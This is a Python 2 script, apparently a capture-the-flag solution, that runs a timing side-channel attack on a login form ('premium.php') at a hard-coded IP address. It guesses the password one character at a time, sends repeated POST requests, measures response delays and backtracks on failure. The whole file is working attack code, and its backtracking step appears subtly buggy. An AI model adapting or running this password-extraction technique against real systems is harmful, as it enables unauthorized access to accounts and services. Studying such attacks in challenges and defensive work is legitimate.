#!/usr/bin/env python

#this file attacks premium.php to get the pass
#requires username to be known

import requests
import string
import time

payload = {'username': '~~FLAG~~', 'password':''}

known_len = 32
known_pass = ""

#letters=string.ascii_lowercase + string.ascii_uppercase + "0123456789" + "{}!@#$%^&*()-=_+[]|\\;',./<>?:\""
letters= "0123456789" + string.ascii_lowercase + string.ascii_uppercase + "_{}"
while len(known_pass) < known_len:
    length = 0
    chari = 0
    dont_touch_chari = False
    while length <= 100:
        added = False
        if known_len != 9999: length = known_len
        if not dont_touch_chari: chari = 0
        while chari < len(letters):
            char = letters[chari]
            payload['password'] = known_pass + char + "_"*(length - len(known_pass) - 1)
            #print payload['password'], len(payload['password'])
            start = time.time()
            r = requests.post("http://54.175.3.248:8089/premium.php", payload)
            end = time.time()
            elapsed = end-start
            if "flag" in r.text.splitlines()[-2]:
                print r.text.splitlines()[-2]
            if elapsed > 0.3*(len(known_pass)+1):
                time.sleep(1)
                start = time.time()
                r = requests.post("http://54.175.3.248:8089/premium.php", payload)
                end = time.time()
                elapsed = end - start
                if elapsed > 0.3*(len(known_pass)+1):
                    known_pass += char
                    known_len = length
                    added = True
                    print "time:", elapsed
                    print "-"*20 + "\nelapsed:\t{}\nlen:\t{}\nchar: {}".format(elapsed, length, char)
                    print known_pass
                    break
            chari += 1
        if known_pass != "" and not added: #prev char is probably wrong
            chari = letters.find(known_pass[:-1])
            dont_touch_chari = True
            known_pass = known_pass[:-1]
            known_len = 9999
            length -= 1
        length += 1
